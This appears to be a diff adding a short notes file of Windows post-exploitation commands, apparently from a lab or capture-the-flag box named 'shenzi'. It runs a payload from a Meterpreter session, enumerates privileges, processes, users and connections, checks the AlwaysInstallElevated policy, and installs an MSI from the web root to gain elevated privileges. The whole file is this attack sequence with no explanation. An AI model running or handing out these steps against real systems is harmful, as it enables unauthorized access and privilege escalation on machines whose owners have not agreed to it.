@@ -1,0 +1,18 @@
+execute -f shell.exe #execute the file in meterpreter cmd line
+
+dir /a /o /q
+
+whoami /priv
+tasklist /v
+netstat -a
+echo %username%
+
+
+net users
+net user shenzi
+type ServiceNames.txt
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msiexec /i "C:\xampp\htdocs\shenzi\new.msi"
+
+
